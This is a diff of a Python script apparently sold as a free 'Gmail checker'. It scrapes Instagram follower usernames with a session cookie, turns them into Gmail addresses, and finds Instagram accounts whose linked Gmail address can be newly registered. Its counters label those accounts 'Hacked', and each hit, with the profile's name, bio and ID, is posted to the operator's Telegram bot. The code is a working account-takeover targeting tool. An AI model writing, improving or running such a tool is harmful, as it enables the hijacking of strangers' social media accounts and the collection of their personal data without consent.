@@ -3,18 +3,17 @@ import time
 import random
 import os 
 import json
-print('Activation finished')
-exit()
+
 a=0
 j=0
 b=0
 s=0
 user =''
-seessoin = input('Enter Your Sessoinid : ')
+seessoin = input('\033[1;32mEnter Your Sessoinid : ')
 
-nn=input('Enter Your User : ')
+nn=input('\033[1;34mEnter Your User : ')
 os.system('cls'if os.name=='nt'else'clear')
-def kl(user,nn):
+def fols(user,nn):
     
     global a
     
@@ -79,31 +78,139 @@ def kl(user,nn):
         'x-requested-with': 'XMLHttpRequest'
     }
     try:
-        geg= requests.get(url,headers=head22).json()
-    except requests.exceptions.JSONDecodeError as error:
-        print('Sessoinid Error')
+        try:
+            geg= requests.get(url,headers=head22).json()
+        except requests.exceptions.JSONDecodeError as error:
+            print('Sessoinid Error')
+            exit()
+    except requests.exceptions.ConnectionError as error:
+        print('Error nt')
         exit()
     for i in range(0,fols):
         try:
-            us = geg['users'][i]['username']
-            print(us)
-            a+=1
-            os.system('cls' if os.name=='nt'else'clear')
-            print(f'User : {us}\nDone : {a}')
-            with open('username.txt','a') as f1:
-                f1.write(f'{us}@gmail.com\n')
+            try:
+                
+                us = geg['users'][i]['username']
+            
+                a+=1
+                os.system('cls' if os.name=='nt'else'clear')
+                print(f'033[1;32mUser : {us}\n\033[1;35mDone : {a}')
+                with open('username.txt','a') as f1:
+                    f1.write(f'{us}@gmail.com\n')
+            except KeyError as error:
+                print('\033[1;31mError')
         except IndexError as error:
             user = us
             
             
             
             nn= user
-            kl(user,nn)
+            fols(user,nn)
+#
+####################################################
+
+def fol(user,nn):
+    
+    global a
+    
+    url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(nn)
+    head2={
+        'accept': '*/*',
+        'accept-encoding': 'gzip, deflate, br',
+        'accept-language': 'en-US,en;q=0.9',
+        'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
+        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
+        'sec-ch-prefers-color-scheme': 'light',
+        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+        'viewport-width': '917',
+        'x-asbd-id': '198387',
+        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
+        'x-ig-app-id': '936619743392459',
+        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
+        'x-instagram-ajax': '1006627630',
+        'x-requested-with': 'XMLHttpRequest'
+    }
+    ge = requests.get(url2,headers=head2).json()
+    
+
+    
+    pr = ge['data']['user']['is_private']
+    #if pr =='True':
+        #nn = -us
+        
+    #elif pr=='False':
+        
+    id = ge['data']['user']['id']
+    #fols = ge['data']['user']['edge_follow']['count']
+    foll = ge['data']['user']['edge_followed_by']['count']
+
+    
+    url =f'https://www.instagram.com/api/v1/friendships/{id}/followers/?count={foll}&search_surface=follow_list_page'
+    head22={
+        'accept': '*/*',
+        'accept-encoding': 'gzip, deflate, br',
+        'accept-language': 'en-US,en;q=0.9',
+        'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={seessoin}',
+        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
+        'sec-ch-prefers-color-scheme': 'light',
+        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+        'viewport-width': '917',
+        'x-asbd-id': '198387',
+        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
+        'x-ig-app-id': '936619743392459',
+        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
+        'x-instagram-ajax': '1006627630',
+        'x-requested-with': 'XMLHttpRequest'
+    }
+    try:
+        try:
+            geg= requests.get(url,headers=head22).json()
+        except requests.exceptions.JSONDecodeError as error:
+            print('Sessoinid Error')
+            exit()
+    except requests.exceptions.ConnectionError as error:
+        print('Error nt')
+        exit()
+    for i in range(0,foll):
+        try:
+            try:
+                
+                us = geg['users'][i]['username']
+                print(us)
+                a+=1
+                os.system('cls' if os.name=='nt'else'clear')
+                print(f'User : {us}\nDone : {a}')
+                with open('username.txt','a') as f1:
+                    f1.write(f'{us}@gmail.com\n')
+            except KeyError as error:
+                print('Error')
+        except IndexError as error:
+            user = us
+            nn= user
+            fol(user,nn)
 #
 
+
+
+
+
+
+######################################################
 def gmail():
-    took =input('Enter Your Token Bot : ')
-    idddd =input('Enter Your ID Accouint : ')
+    took =input('\033[1;33m[>] \033[1;31m- \033[1;37mEnter \033[1;32mYour Token \033[1;37mBot \033[1;31m: ')
+    idddd =input('\033[1;35m[>] \033[1;31m- \033[1;37mEnter \033[1;32mYour ID \033[1;37mAccouint \033[1;31m: ')
     global a,b,s,j
     fil = open('username.txt','r').read().splitlines()
     for email in fil:
@@ -137,13 +244,17 @@ def gmail():
             'optIntoOneTap': 'false',
             'trustedDeviceRecords': '{}'
         }
-        rf = requests.post(url,headers=head1,data=data)
+        try:
+            rf = requests.post(url,headers=head1,data=data)
+        except requests.exceptions.ConnectionError as error:
+            continue
         print(rf)
+    
         
         if rf.status_code==403:
             b+=1
             os.system('cls'if os.name=='nt'else'clear')
-            print(f'Hacked : {a} - Bad Gmail : {s} - Bad Instagram : {b}\n')
+            print(f'\033[1;37mHacked : \033[1;32m{a} \033[1;34m- \033[1;37mBad Gmail : \033[1;31m{s} \033[1;34m- \033[1;37mBad Instagram : \033[1;33m{b}\n')
         elif rf.status_code==200:
             url0='https://accounts.google.com/_/signup/webusernameavailability?hl=ar&_reqid=475082&rt=j'
             headers2 = {
@@ -182,15 +293,15 @@ def gmail():
                   res=requests.post(url0,headers=headers2,data=data1).text
             except requests.exceptions.ConnectionError as error:
                 continue
-            print(res)
+            
             if ('"gf.wuar",2') in res:
                 s+=1
                 os.system('cls'if os.name=='nt'else'clear')
-                print(f'Hacked : {a} - Bad Gmail : {s} - Bad Instagram : {b}\n')
+                print(f'\033[1;37mHacked : \033[1;32m{a} \033[1;34m- \033[1;37mBad Gmail : \033[1;31m{s} \033[1;34m- \033[1;37mBad Instagram : \033[1;33m{b}\n')
             elif ('"EmailInvalid"') in res:
                 s+=1
                 os.system('cls'if os.name=='nt'else'clear')
-                print(f'Hacked : {a} - Bad Gmail : {s} - Bad Instagram : {b}\n')
+                print(f'\033[1;37mHacked : \033[1;32m{a} \033[1;34m- \033[1;37mBad Gmail : \033[1;31m{s} \033[1;34m- \033[1;37mBad Instagram : \033[1;33m{b}\n')
             
             elif ('"gf.wuar",1') in res:
             
@@ -219,7 +330,11 @@ def gmail():
                     'x-instagram-ajax': '1006627630',
                     'x-requested-with': 'XMLHttpRequest'
                 }
-                ge = requests.get(url2,headers=head2).json()
+                try:
+                    
+                    ge = requests.get(url2,headers=head2).json()
+                except requests.exceptions.ConnectionError as error:
+                    continue
                 try:
                     
                     id = ge['data']['user']['id']
@@ -231,10 +346,10 @@ def gmail():
                 except KeyError as error :
                     b+=1
                     os.system('cls'if os.name=='nt'else'clear')
-                    print(f'Hacked : {a} - Bad Gmail : {s} - Bad Instagram : {b}\n')
+                    print(f'\033[1;37mHacked : \033[1;32m{a} \033[1;34m- \033[1;37mBad Gmail : \033[1;31m{s} \033[1;34m- \033[1;37mBad Instagram : \033[1;33m{b}\n')
                 a+=1
                 os.system('cls'if os.name=='nt'else'clear')
-                print(f'Hacked : {a} - Bad Gmail : {s} - Bad Instagram : {b}\n')
+                print(f'\033[1;37mHacked : \033[1;32m{a} \033[1;34m- \033[1;37mBad Gmail : \033[1;31m{s} \033[1;34m- \033[1;37mBad Instagram : \033[1;33m{b}\n')
                 rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
                 ree = rl.json()
                 da = ree['date']
@@ -262,7 +377,7 @@ def gmail():
                     b+=1
                 j+=1
                 try:
-                    lm = f'Hit : {j}\nName : {nam}\nUsername : {nn}\nEmail : {email}\nFollowing : {fol}\nFollowers : {fols}\nBio : {bio}\nData : {da}\nID : {id}\nRest: {rs}\n'
+                    lm = f'✓ 𝙷𝙸𝚃 : {j}\n✓ 𝙵𝙺𝙻𝙻 𝙽𝙰𝙼𝙴 : {nam}\n✓ 𝙺𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {nn}\n✓ 𝙴𝙼𝙰𝙸𝙻 : {email}\n✓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 : {fols}\n✓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂: {fol}\n✓ 𝙱𝙸𝙾 : {bio}\n✓ 𝙺𝚂𝙴𝚁 𝙸𝙳 : {id}\n✓ 𝚁𝙴𝚂𝚃 : {rs}\n✓ 𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙸𝙽𝚃 : {da}\n✓ 𝙱𝚈 : @MVMVP - @FFNZZ - @FFNZZ1'
                     tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={lm}')
                     ru= requests.post(tlg)
                     with open('trueinstagram.txt','a') as f8:
@@ -323,8 +438,8 @@ def yahoo():
         
     
 def login():
-    username = input('Enter Your usernaem : ')
-    pasw = input('Enter Your Password : ')
+    username = input('\033[1;32mEnter Your usernaem : ')
+    pasw = input('\033[1,32mEnter Your Password : ')
     url ='https://www.instagram.com/api/v1/web/accounts/login/ajax/'
     
     head = {
@@ -362,16 +477,27 @@ def login():
         sessoin = coo['sessionid']
         print(sessoin)
     elif ('"checkpoint_url"') in rf.text:
-        print('Secuer')
+        print('\033[1;33mSecuer')
     elif ('"user":true,"authenticated":false') in rf.text:
-        print('Password False')
+        print('\033[1;31mPassword False')
 #########################################################################################333
-print('Gmail Tool Free 0.1 , @MVMVP')
-print('[1] - List username\n[2] - Checker\n[0] - Sessoinid')
+print('\033[1;37mGmail \033[1;32mTool \033[1;37mFree \033[1;33m0\033[1;31m.\033[1;33m1 \033[1;31m, \033[1;32m@MVMVP')
+print('\033[1;32m[1] - List username\n[2] - Checker\n[0] - Sessoinid')
 inp = str(input('[-] Enter Your :'))
 os.system('cls' if os.name=='nt'else'clear')
 if inp=='1':
-    kl(user,nn)
+    os.system('cls'if os.name=='nt'else'clear')
+    print('\033[1;32m[1] \033[1;34m- \033[1;35mFollowers \033[1;34m- يتابع\n\033[1;32m[2] \033[1;34m- \033[1;35mFollwoing \033[1;3m- متابعين\n')
+    ia = str(input('Enter Your Choice : '))
+    if ia=='1':
+        os.system('cls'if os.name=='nt'else'clear')
+        fols(user,nn)
+    elif ia=='2':
+        os.system('cls'if os.name=='nt'else'clear')
+        fol(user,nn)
+    else:
+        os.system('cls'if os.name=='nt'else'clear')
+        print('Choice Error')
 elif inp=='2':
     gmail()
 elif inp=='0':
